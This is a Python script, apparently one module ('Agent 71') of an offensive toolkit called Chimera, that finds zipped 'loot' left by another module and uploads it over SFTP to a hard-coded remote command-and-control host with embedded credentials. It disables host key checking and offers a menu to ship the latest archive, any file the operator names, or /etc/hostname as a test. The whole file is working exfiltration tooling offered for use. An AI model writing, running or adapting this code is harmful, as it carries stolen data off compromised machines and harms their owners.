import os
import sys
import pysftp
import json

class SFTPUploader:
    """
    Chimera Agent 71: Secure Exfiltration Pilot
    Purpose: Automated upload of compressed loot to remote C2 via SFTP.
    """
    def __init__(self):
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.chimera_root = os.path.dirname(os.path.dirname(self.script_dir))
        
        # This points to where Agent 70 drops its bags
        self.zip_source = os.path.join(self.chimera_root, "70_Exfiltration_Zipper", "loot")
        
        # Remote C2 Configuration (Update these for your actual drop-box)
        self.host = "192.168.1.100" 
        self.user = "chimera_drop"
        self.password = "secure_pass_123"
        self.remote_path = "/home/chimera_drop/loot_drop/"

    def get_latest_zip(self):
        """Finds the most recent ZIP file in the exfiltration staging area."""
        if not os.path.exists(self.zip_source):
            return None
        
        files = [os.path.join(self.zip_source, f) for f in os.listdir(self.zip_source) if f.endswith(".zip")]
        if not files:
            return None
            
        return max(files, key=os.path.getmtime)

    def upload_loot(self, local_file):
        """Establishes an encrypted tunnel and ships the file."""
        print(f"[*] Agent 71: Attempting secure exfiltration of {os.path.basename(local_file)}...")
        
        # Disable host key checking for automated agility (Standard Red Team Move)
        cnopts = pysftp.CnOpts()
        cnopts.hostkeys = None 

        try:
            with pysftp.Connection(self.host, username=self.user, password=self.password, cnopts=cnopts) as sftp:
                print(f"[+] Tunnel Established: {self.host}")
                
                # Ensure remote directory exists
                try:
                    sftp.mkdir(self.remote_path)
                except:
                    pass # Directory likely already exists

                with sftp.cd(self.remote_path):
                    sftp.put(local_file)
                
                print(f"[!!!] SUCCESS: Loot successfully exfiltrated to C2.")
                return True
        except Exception as e:
            print(f"[!] Agent 71 Error: Connection failed. {e}")
            return False

    def menu(self):
        print("\n" + "="*60)
        print("   AGENT 71 :: SFTP UPLOADER :: CHIMERA SWARM")
        print("="*60)
        print(f"Target C2: {self.user}@{self.host}")
        print("-" * 60)
        print("1. Exfiltrate Latest Zip (Auto-Detect)")
        print("2. Manual File Upload")
        print("3. Test Connection to C2")
        print("0. Return to Commander")
        
        choice = input("\nSelect Action > ")
        
        if choice == "1":
            latest = self.get_latest_zip()
            if latest:
                self.upload_loot(latest)
            else:
                print("[-] No ZIP files found in Agent 70 loot.")
        elif choice == "2":
            path = input("Enter path to file: ")
            if os.path.exists(path):
                self.upload_loot(path)
        elif choice == "3":
            # Simple connection test
            self.upload_loot("/etc/hostname") # Small harmless file for test
        elif choice == "0":
            sys.exit(0)

if __name__ == "__main__":
    uploader = SFTPUploader()
    uploader.menu()
